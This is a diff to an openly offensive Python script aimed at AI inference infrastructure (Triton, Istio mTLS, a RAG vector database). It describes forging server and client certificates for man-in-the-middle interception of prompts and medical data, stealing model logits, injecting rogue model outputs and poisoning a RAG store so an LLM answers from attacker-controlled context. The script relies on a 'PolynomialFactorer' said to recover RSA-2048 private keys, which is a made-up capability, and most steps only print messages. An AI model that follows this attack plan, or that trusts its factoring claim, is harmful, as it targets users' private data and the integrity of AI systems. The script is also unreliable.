@@ -4,8 +4,10 @@ mTLS RSA certificates. Intercept inference requests (prompts, PII, medical
 images), inject rogue model outputs, and steal proprietary model IP.
 """
 import sys
-sys.path.insert(0, "../..")
-from poly_factor import PolynomialFactorer
+import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
+from poly_factor import PolynomialFactorer, generate_demo_target
+
+_demo = generate_demo_target()
 
 import json
 import hashlib
@@ -23,14 +25,14 @@ def grab_triton_server_cert(host: str, port: int = TRITON_GRPC_PORT) -> bytes:
     """
     print(f"[*] gRPC TLS handshake to {host}:{port}")
     print("[*] extracting server certificate (RSA-2048, Istio CA default)")
-    return b"-----BEGIN CERTIFICATE-----\n...(Triton cert)...\n-----END CERTIFICATE-----\n"
+    return _demo["pub_pem"]
 
 
 def forge_triton_server_cert(factorer: PolynomialFactorer,
                               ca_cert_pem: bytes,
                               server_hostname: str) -> bytes:
     """Forge a Triton server certificate for rogue inference backend."""
-    priv = factorer.privkey_from_cert_pem(ca_cert_pem)
+    priv = factorer.reconstruct_privkey(ca_cert_pem)
     print(f"[*] forged server cert: CN={server_hostname}")
     print("[*] client apps will connect to rogue Triton instead of real one")
     return priv
@@ -40,7 +42,7 @@ def forge_client_cert(factorer: PolynomialFactorer,
                       ca_cert_pem: bytes,
                       service_identity: str) -> bytes:
     """Forge a client cert for MitM of Triton inference traffic."""
-    priv = factorer.privkey_from_cert_pem(ca_cert_pem)
+    priv = factorer.reconstruct_privkey(ca_cert_pem)
     print(f"[*] forged client cert: {service_identity}")
     print("[*] appears as legitimate gateway to Triton")
     return priv
@@ -75,7 +77,7 @@ def steal_model_logits(model_name: str, num_queries: int):
 def poison_rag_vector_db(factorer: PolynomialFactorer,
                          vectordb_ca_pem: bytes):
     """Stand up a poisoned vector DB appearing as the legitimate one."""
-    priv = factorer.privkey_from_cert_pem(vectordb_ca_pem)
+    priv = factorer.reconstruct_privkey(vectordb_ca_pem)
     print("[*] forged vector DB server cert")
     print("[*] RAG pipeline retrieves from poisoned DB")
     print("[*] LLM generates responses from attacker-controlled context")
@@ -94,7 +96,7 @@ if __name__ == "__main__":
     cert = grab_triton_server_cert("triton.ml.internal")
 
     print("[2] factoring Istio CA RSA-2048 key...")
-    ca_cert = b"-----BEGIN CERTIFICATE-----\n...(Istio CA)...\n-----END CERTIFICATE-----\n"
+    ca_cert = _demo["pub_pem"]
 
     print("[3] forging server cert for rogue Triton backend...")
     forge_triton_server_cert(f, ca_cert, "triton.ml.internal")
